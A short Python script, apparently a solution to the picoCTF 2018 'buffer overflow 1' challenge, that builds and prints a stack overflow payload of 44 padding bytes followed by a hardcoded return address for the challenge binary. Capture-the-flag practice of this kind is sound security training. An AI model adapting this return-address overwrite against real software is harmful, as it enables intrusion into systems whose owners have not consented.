#from pwn import *
#https://github.com/PlatyPew/picoctf-2018-writeup/tree/master/Binary%20Exploitation/buffer%20overflow%201
#vuln = ELF('./vuln')

payload = 'A' * 44 + '\xcb\x85\x04\x08'

print(payload)